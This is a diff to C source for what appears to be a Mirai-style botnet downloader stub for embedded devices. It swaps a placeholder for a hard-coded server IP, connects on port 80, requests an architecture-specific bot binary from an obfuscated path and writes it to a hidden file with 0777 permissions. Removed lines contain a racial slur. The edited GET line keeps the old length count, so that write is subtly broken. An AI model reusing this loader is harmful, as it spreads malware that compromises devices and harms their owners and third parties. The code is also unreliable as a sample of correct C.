@@ -1,17 +1,16 @@
 #include <sys/types.h>
-//#include <bits/syscalls.h>
 #include <sys/syscall.h>
 #include <fcntl.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(1,1,1,1) // CHANGE TO YOUR HTTP SERVER IP
+#define HTTP_SERVER utils_inet_addr(91,122,37,169)
 
-#define EXEC_MSG            "NIGGY\n"
-#define EXEC_MSG_LEN        6
+#define EXEC_MSG            "magician\n"
+#define EXEC_MSG_LEN        9
 
-#define DOWNLOAD_MSG        "RAY\n"
-#define DOWNLOAD_MSG_LEN    4
+#define DOWNLOAD_MSG        "sikeriz\n"
+#define DOWNLOAD_MSG_LEN    8
 
 #define STDIN   0
 #define STDOUT  1
@@ -57,8 +56,18 @@ void x__exit(int);
 #define close xclose
 #define __exit x__exit
 
+#ifdef DEBUG
+/*
+void xprintf(char *str)
+{
+    write(1, str, sstrlen(str));
+}
+#define printf xprintf
+*/
+#endif
+
 void __start(void)
-{ 
+{
 #if defined(MIPS) || defined(MIPSEL)
     __asm(
         ".set noreorder\n"
@@ -87,7 +96,7 @@ inline void run(void)
     addr.sin_port = HTONS(80);
     addr.sin_addr.s_addr = HTTP_SERVER;
 
-    ffd = open("19ju3d", O_WRONLY | O_CREAT | O_TRUNC, 0777);
+    ffd = open(".06", O_WRONLY | O_CREAT | O_TRUNC, 0777);
 
     sfd = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -110,7 +119,7 @@ inline void run(void)
 #ifdef DEBUG
         printf("Failed to connect to host.\n");
 #endif
-        write(STDOUT, "YAR\n", 4);
+        write(STDOUT, "sikeriz\n", 8);
         __exit(-ret);
     }
 
@@ -118,7 +127,7 @@ inline void run(void)
     printf("Connected to host\n");
 #endif
 
-    if (write(sfd, "GET /bins/dano." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
+    if (write(sfd, "GET /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
     {
 #ifdef DEBUG
         printf("Failed to send get request.\n");
